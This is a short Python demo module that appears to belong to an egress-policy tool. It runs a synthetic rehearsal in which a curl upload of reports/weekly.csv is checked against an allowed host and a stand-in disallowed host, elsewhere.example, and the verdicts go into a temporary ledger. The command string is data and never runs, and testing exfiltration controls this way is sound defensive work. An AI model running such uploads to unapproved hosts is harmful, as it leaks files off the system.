"""Deterministic isolated route rehearsal; transfer strings never execute."""
from tempfile import TemporaryDirectory
from .ledger import Ledger, format_feed
from .policy import Policy
from .report import format_verdict


def replay():
    policy = Policy(routes=[{'paths': ['reports/**'], 'to': ['https://uploads.example/reports/*']}])
    lines = ['fixture | synthetic route rehearsal; no execution; isolated feed', policy.describe_routes()]
    with TemporaryDirectory(prefix='exfilbar-demo-') as directory:
        ledger = Ledger(directory, clock=lambda: '2000-01-01T00:00:00+00:00')
        for host in ('uploads.example', 'elsewhere.example'):
            verdict = policy.evaluate('curl -T reports/weekly.csv https://' + host + '/reports/weekly.csv')
            ledger.record('synthetic-demo', 'terminal', policy.inspection)
            lines.append('fixture | reports/weekly.csv | ' + format_verdict(verdict, True))
        lines.append(format_feed(ledger.read('synthetic-demo')))
    return '\n'.join(lines)
